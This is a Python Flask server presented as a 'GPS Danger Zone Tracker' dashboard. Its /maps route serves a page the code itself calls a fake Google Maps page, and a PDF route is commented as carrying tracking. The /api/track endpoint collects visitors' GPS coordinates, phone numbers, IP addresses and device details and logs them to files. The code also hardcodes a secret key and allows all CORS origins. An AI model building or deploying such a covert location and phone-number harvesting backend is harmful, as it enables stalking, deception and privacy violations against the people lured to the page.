#!/usr/bin/env python3
"""
Standalone Web Server for GPS Danger Zone Tracker

Runs a web dashboard to monitor and manage the GPS tracking system.
"""

import json
import math
import random
import glob
from datetime import datetime
from flask import Flask, render_template, jsonify, request, send_file
from flask_socketio import SocketIO
from pathlib import Path
from typing import Dict, Any

# Initialize Flask app
app = Flask(__name__, 
            template_folder='src/web/templates',
            static_folder='src/web/static')
app.config['SECRET_KEY'] = 'gps_tracker_secret_key_2024'

# Initialize SocketIO
socketio = SocketIO(app, cors_allowed_origins="*")


def _extract_client_info(req) -> Dict[str, Any]:
    """Extract client info (IP, UA, basic device flags) from request.

    Returns a dict with fields:
    - ip: best-effort client IP (X-Forwarded-For or remote_addr)
    - forwarded_for: raw X-Forwarded-For header if present
    - user_agent: full UA string
    - device: { is_mobile, is_android, is_ios, is_iphone, is_ipad, is_windows, is_macos, is_linux }
    """
    try:
        forwarded_for = req.headers.get('X-Forwarded-For') or req.headers.get('X-Forwarded-for')
        # X-Forwarded-For can contain multiple IPs, take the first non-empty
        ip = None
        if forwarded_for:
            parts = [p.strip() for p in forwarded_for.split(',') if p.strip()]
            if parts:
                ip = parts[0]
        if not ip:
            ip = req.headers.get('X-Real-IP') or req.remote_addr

        ua = (req.headers.get('User-Agent') or '').lower()
        device = {
            'is_mobile': any(k in ua for k in ['android', 'iphone', 'ipad', 'mobile']),
            'is_android': 'android' in ua,
            'is_ios': ('iphone' in ua) or ('ipad' in ua),
            'is_iphone': 'iphone' in ua,
            'is_ipad': 'ipad' in ua,
            'is_windows': 'windows' in ua,
            'is_macos': 'mac os x' in ua or 'macintosh' in ua,
            'is_linux': 'linux' in ua and 'android' not in ua,
        }

        return {
            'ip': ip,
            'forwarded_for': forwarded_for,
            'user_agent': req.headers.get('User-Agent'),
            'device': device,
            'accept_language': req.headers.get('Accept-Language'),
            'origin': req.headers.get('Origin'),
            'referer': req.headers.get('Referer'),
        }
    except Exception as e:
        return {
            'error': f'client_info_extraction_failed: {e}'
        }

# Global variables to store current state
current_location = {
    'latitude': 40.7128,
    'longitude': -74.0060,
    'accuracy': 5.0,
    'speed': 0.0,
    'timestamp': datetime.now().isoformat()
}

def get_tracking_data():
    """Get all tracking data in chronological order."""
    tracking_data = []
    tracking_dir = Path("data/tracking")
    
    if not tracking_dir.exists():
        return tracking_data
    
    try:
        # Read GPS coordinates
        gps_file = tracking_dir / "gps_coordinates.jsonl"
        if gps_file.exists():
            with open(gps_file, 'r') as f:
                for line in f:
                    data = json.loads(line.strip())
                    data['type'] = 'gps'
                    tracking_data.append(data)
        
        # Read phone numbers
        phones_file = tracking_dir / "phone_numbers.jsonl"
        if phones_file.exists():
            with open(phones_file, 'r') as f:
                for line in f:
                    data = json.loads(line.strip())
                    data['type'] = 'phone'
                    tracking_data.append(data)
        
        # Read session summaries
        sessions_file = tracking_dir / "session_summaries.jsonl"
        if sessions_file.exists():
            with open(sessions_file, 'r') as f:
                for line in f:
                    data = json.loads(line.strip())
                    data['type'] = 'session'
                    tracking_data.append(data)
        
        # Read individual session files
        for session_file in tracking_dir.glob('*.jsonl'):
            if session_file.name not in ['gps_coordinates.jsonl', 'phone_numbers.jsonl', 'session_summaries.jsonl']:
                with open(session_file, 'r') as f:
                    for line in f:
                        data = json.loads(line.strip())
                        data['type'] = 'session_event'
                        data['session_file'] = session_file.stem
                        tracking_data.append(data)
        
        # Sort by timestamp
        tracking_data.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
        
    except Exception as e:
        print(f"Error reading tracking data: {e}")
    
    return tracking_data

# Simulation variables
simulation_step = 0
simulation_running = False

def load_zones():
    """Load zones from configuration file."""
    try:
        zones_file = Path('config/zones.json')
        if zones_file.exists():
            with open(zones_file, 'r') as f:
                zones_config = json.load(f)
                return zones_config.get('danger_zones', [])
    except Exception as e:
        print(f"Error loading zones: {e}")
    
    # Return default zones if loading fails
    return [
        {
            "id": "zone_001",
            "name": "Zona Cantiere Roma Centro",
            "description": "Zona lavori attiva con mezzi pesanti",
            "type": "construction",
            "geometry": {
                "type": "circle",
                "center": {
                    "latitude": 41.9028,  # Rome center
                    "longitude": 12.4964
                },
                "radius": 200
            },
            "severity": "high",
            "active": True
        }
    ]

def simulate_gps_movement():
    """Simulate GPS movement for demonstration."""
    global simulation_step, current_location
    
    # Base location (Italy - Rome area) 
    base_lat = 41.9028  # Rome, Italy
    base_lon = 12.4964
    
    # Create circular movement pattern
    radius = 0.01  # About 1km radius
    angle = (simulation_step * 0.05) % (2 * math.pi)
    
    lat = base_lat + radius * math.cos(angle) + random.uniform(-0.001, 0.001)
    lon = base_lon + radius * math.sin(angle) + random.uniform(-0.001, 0.001)
    
    current_location = {
        'latitude': lat,
        'longitude': lon,
        'altitude': 10.0 + random.uniform(-5, 15),
        'speed': 5.0 + random.uniform(-2, 5),  # m/s
        'heading': math.degrees(angle),
        'timestamp': datetime.now().isoformat(),
        'accuracy': 3.0 + random.uniform(0, 2),
        'source': 'simulation'
    }
    
    simulation_step += 1
    
    # Emit location update to all connected clients
    socketio.emit('location_update', current_location)

# Routes
@app.route('/')
def dashboard():
    """Main dashboard page."""
    return render_template('index.html')

@app.route('/maps')
def fake_maps():
    """Fake Google Maps page for GPS tracking."""
    # Read and serve the fake maps HTML file
    try:
        with open('fake_maps.html', 'r', encoding='utf-8') as f:
            content = f.read()
        return content
    except FileNotFoundError:
        return "Fake maps page not found", 404

@app.route('/api/status')
def get_status():
    """Get current system status."""
    return jsonify({
        'status': 'running',
        'gps_connected': True,
        'zones_loaded': True,
        'alerts_enabled': True,
        'simulation_running': simulation_running
    })

@app.route('/api/location')
def get_current_location():
    """Get current GPS location."""
    return jsonify(current_location)

@app.route('/api/zones')
def get_zones():
    """Get all danger zones."""
    zones = load_zones()
    return jsonify({
        'zones': zones,
        'count': len(zones)
    })

@app.route('/api/zones', methods=['POST'])
def add_zone():
    """Add a new danger zone."""
    try:
        data = request.get_json()
        
        # Create new zone
        new_zone = {
            'id': f"zone_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
            'name': data['name'],
            'description': data.get('description', ''),
            'type': data['type'],
            'geometry': {
                'type': 'circle',
                'center': {
                    'latitude': data['latitude'],
                    'longitude': data['longitude']
                },
                'radius': data['radius']
            },
            'severity': data['severity'],
            'active': True,
            'created_date': datetime.now().strftime('%Y-%m-%d'),
            'alerts': {
                'entry': True,
                'exit': False,
                'proximity': 50
            }
        }
        
        # Load current zones
        zones_file = Path('config/zones.json')
        if zones_file.exists():
            with open(zones_file, 'r') as f:
                zones_config = json.load(f)
        else:
            zones_config = {'danger_zones': []}
        
        # Add new zone
        zones_config['danger_zones'].append(new_zone)
        
        # Save updated zones
        with open(zones_file, 'w') as f:
            json.dump(zones_config, f, indent=2)
        
        return jsonify({'success': True, 'zone': new_zone})
        
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/zones/<zone_id>', methods=['DELETE'])
def delete_zone(zone_id):
    """Delete a danger zone."""
    try:
        zones_file = Path('config/zones.json')
        if zones_file.exists():
            with open(zones_file, 'r') as f:
                zones_config = json.load(f)
            
            # Remove zone
            original_count = len(zones_config['danger_zones'])
            zones_config['danger_zones'] = [
                zone for zone in zones_config['danger_zones'] 
                if zone.get('id') != zone_id
            ]
            
            if len(zones_config['danger_zones']) < original_count:
                # Save updated zones
                with open(zones_file, 'w') as f:
                    json.dump(zones_config, f, indent=2)
                return jsonify({'success': True})
            else:
                return jsonify({'success': False, 'message': 'Zone not found'})
        else:
            return jsonify({'success': False, 'message': 'Zones file not found'})
            
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/alerts')
def get_alerts():
    """Get recent alerts."""
    # Mock alerts for demonstration
    sample_alerts = [
        {
            'timestamp': datetime.now().isoformat(),
            'zone_name': 'Construction Site Alpha',
            'severity': 'high',
            'message': 'Entered danger zone'
        }
    ]
    
    return jsonify({
        'alerts': sample_alerts,
        'count': len(sample_alerts)
    })

@app.route('/api/tracking')
def get_tracking():
    """Get all tracking data in chronological order."""
    tracking_data = get_tracking_data()
    return jsonify({
        'tracking_data': tracking_data,
        'count': len(tracking_data),
        'last_updated': datetime.now().isoformat()
    })

@app.route('/pdf/psicologia')
def serve_psicologia_pdf():
    """Serve il PDF PSICOLOGIA GIURIDICA con tracking"""
    try:
        pdf_file = 'PSICOLOGIA GIURIDICA AIPG.pdf'
        return send_file(pdf_file, 
                        mimetype='application/pdf',
                        as_attachment=False,
                        download_name='PSICOLOGIA_GIURIDICA_AIPG.pdf')
    except Exception as e:
        return jsonify({'error': f'PDF not found: {e}'}), 404

@app.route('/api/client-info')
def get_client_info():
    """Get client info (IP, UA, device flags) for the current request."""
    client_info = _extract_client_info(request)
    return jsonify({
        'client_info': client_info,
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/track', methods=['POST'])
def track_user():
    """Endpoint per ricevere dati di tracking GPS e telefono."""
    try:
        data = request.get_json() or {}

        # Enrich with server-side client info (IP, UA, device flags)
        client_info = _extract_client_info(request)
        data.setdefault('meta', {})
        data['meta']['server_received_at'] = datetime.now().isoformat()
        data['meta']['client_info'] = client_info
        # Ensure top-level userAgent is set if not provided by client
        if not data.get('userAgent') and client_info.get('user_agent'):
            data['userAgent'] = client_info.get('user_agent')
        
        # Log dei dati ricevuti
        print(f"\n🎯 TRACKING DATA RECEIVED:")
        print(f"IP: {client_info.get('ip')} | UA: {client_info.get('user_agent')}")
        print(f"Session ID: {data.get('sessionId')}")
        print(f"Event Type: {data.get('eventType')}")
        print(f"Timestamp: {data.get('timestamp')}")
        print(f"Data: {data.get('data')}")
        print("="*50)
        
        # Salva in file per tracking persistente
        import json
        from pathlib import Path
        
        # Ensure tracking directory exists
        # ⚠️ NOTA: Su Render questi file vengono persi al restart!
        # Per persistenza permanente serve un database esterno
        tracking_dir = Path("data/tracking")
        tracking_dir.mkdir(parents=True, exist_ok=True)
        
        # 📁 BACKUP LOCALE: Salva anche in TXT locale permanente
        def save_to_local_backup(event_type, session_id, data_content):
            try:
                backup_file = Path("tracking_backup.txt")
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                with open(backup_file, 'a', encoding='utf-8') as f:
                    f.write(f"\n[{timestamp}] {event_type.upper()} | Session: {session_id}")
                    # Include IP and UA summary in backup line
                    if isinstance(client_info, dict):
                        ip = client_info.get('ip')
                        ua = client_info.get('user_agent')
                        if ip or ua:
                            f.write(f" | IP: {ip or 'unknown'} | UA: {ua or 'unknown'}")
                    f.write(f" | Dati: {json.dumps(data_content, ensure_ascii=False)}\n")
                    
                    # Se è GPS, aggiungi riga formattata
                    if event_type == 'location_captured' and isinstance(data_content, dict):
                        if 'latitude' in data_content and 'longitude' in data_content:
                            f.write(f"    📍 GPS: {data_content['latitude']}, {data_content['longitude']}\n")
                    
                    # Se è telefono, aggiungi riga formattata  
                    elif event_type == 'phone_captured' and isinstance(data_content, dict):
                        if 'phone' in data_content:
                            f.write(f"    📱 Tel: {data_content['phone']}\n")
                            
            except Exception as e:
                print(f"Errore backup locale: {e}")
        
        # Nome file basato sulla sessione
        session_id = data.get('sessionId', 'unknown')
        tracking_file = tracking_dir / f"{session_id}.jsonl"
        client_info_file = tracking_dir / "client_info.jsonl"
        
        # Append enriched event data to session file
        with open(tracking_file, 'a') as f:
            f.write(json.dumps(data) + '\n')
        
        # Also append/refresh client info snapshot for convenience
        with open(client_info_file, 'a') as f:
            snapshot = {
                'session_id': session_id,
                'received_at': data['meta']['server_received_at'],
                'client_info': client_info,
                'event_type': data.get('eventType'),
                'screen': (data.get('data') or {}).get('screen'),  # if provided by client
            }
            f.write(json.dumps(snapshot) + '\n')
        
        # 📁 BACKUP LOCALE per tutti gli eventi
        save_to_local_backup(data.get('eventType', 'unknown'), session_id, data.get('data', data))
        
# Se abbiamo coordinate GPS, salvale separatamente
        if data.get('eventType') == 'location_captured':
            location_data = data.get('data', {})
            if location_data.get('latitude') and location_data.get('longitude'):
                print(f"\n📍 GPS COORDINATES CAPTURED:")
                print(f"Latitude: {location_data['latitude']}")
                print(f"Longitude: {location_data['longitude']}")
                print(f"Accuracy: {location_data.get('accuracy', 'unknown')} meters")
                print(f"Timestamp: {location_data.get('timestamp')}")
                
                # Salva coordinate in file separato
                coords_file = tracking_dir / "gps_coordinates.jsonl"
                with open(coords_file, 'a') as f:
                    coord_entry = {
                        'session_id': session_id,
                        'timestamp': location_data.get('timestamp'),
                        'latitude': location_data['latitude'],
                        'longitude': location_data['longitude'],
                        'accuracy': location_data.get('accuracy'),
                        'user_agent': data.get('userAgent') or client_info.get('user_agent'),
                        'ip': client_info.get('ip'),
                    }
                    f.write(json.dumps(coord_entry) + '\n')
                
                # 📁 BACKUP LOCALE per coordinate GPS
                save_to_local_backup('location_captured', session_id, location_data)
        
# Se abbiamo un numero di telefono
        if data.get('eventType') == 'phone_captured':
            phone_data = data.get('data', {})
            phone = phone_data.get('phone')
            if phone:
                print(f"\n📱 PHONE NUMBER CAPTURED:")
                print(f"Phone: {phone}")
                print(f"Session: {session_id}")
                print(f"Timestamp: {phone_data.get('timestamp')}")
                
                # Salva telefoni in file separato
                phones_file = tracking_dir / "phone_numbers.jsonl"
                with open(phones_file, 'a') as f:
                    phone_entry = {
                        'session_id': session_id,
                        'timestamp': phone_data.get('timestamp'),
                        'phone': phone,
                        'user_agent': data.get('userAgent') or client_info.get('user_agent'),
                        'ip': client_info.get('ip'),
                    }
                    f.write(json.dumps(phone_entry) + '\n')
                
                # 📁 BACKUP LOCALE per numeri telefono
                save_to_local_backup('phone_captured', session_id, phone_data)
        
# Se è una sessione completa, crea summary
        if data.get('eventType') == 'session_complete':
            session_data = data.get('data', {})
            print(f"\n✅ SESSION COMPLETE:")
            print(f"Session ID: {session_id}")
            
            location = session_data.get('location')
            if location:
                print(f"Final GPS: {location['latitude']}, {location['longitude']}")
            
            phone = session_data.get('phone')
            if phone:
                print(f"Phone: {phone}")
            
            # Salva summary completo (arricchito con client info)
            summary_file = tracking_dir / "session_summaries.jsonl"
            with open(summary_file, 'a') as f:
                enriched = {
                    **session_data,
                    'session_id': session_id,
                    'client_info': client_info,
                    'received_at': data['meta']['server_received_at'],
                    'user_agent': data.get('userAgent') or client_info.get('user_agent'),
                }
                f.write(json.dumps(enriched) + '\n')
            
            # 📁 BACKUP LOCALE per sessione completa
            save_to_local_backup('session_complete', session_id, session_data)
        
        return jsonify({'status': 'success', 'message': 'Data tracked successfully'})
        
    except Exception as e:
        print(f"Error in tracking endpoint: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# SocketIO events
@socketio.on('connect')
def handle_connect():
    """Handle client connection."""
    print(f'Client connected: {request.sid}')
    # Send current location immediately
    socketio.emit('location_update', current_location)

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnection."""
    print(f'Client disconnected: {request.sid}')

@socketio.on('start_simulation')
def handle_start_simulation():
    """Start GPS simulation."""
    global simulation_running
    simulation_running = True
    print("GPS simulation started")

@socketio.on('stop_simulation')
def handle_stop_simulation():
    """Stop GPS simulation."""
    global simulation_running
    simulation_running = False
    print("GPS simulation stopped")

def start_background_simulation():
    """Start background GPS simulation."""
    global simulation_running
    simulation_running = True
    
    def simulate():
        while simulation_running:
            simulate_gps_movement()
            socketio.sleep(2)  # Update every 2 seconds
    
    socketio.start_background_task(simulate)

if __name__ == '__main__':
    import os
    
    # Get port from environment variable (Render uses this) or default to 5000
    port = int(os.environ.get('PORT', 5000))
    
    print("🛰️ Starting GPS Danger Zone Tracker Web Dashboard")
    print(f"📊 Dashboard will be available at: http://localhost:{port}")
    print("🗺️  Features available:")
    print("   - Live GPS simulation")
    print("   - Interactive map with danger zones")
    print("   - Zone management")
    print("   - Real-time alerts")
    print("   - System monitoring")
    print()
    
    # Start background simulation
    start_background_simulation()
    
    # Run the web server
    is_production = os.environ.get('RENDER') or os.environ.get('PORT')
    socketio.run(
        app, 
        debug=not is_production, 
        host='0.0.0.0', 
        port=port,
        allow_unsafe_werkzeug=True  # Required for Render deployment
    )
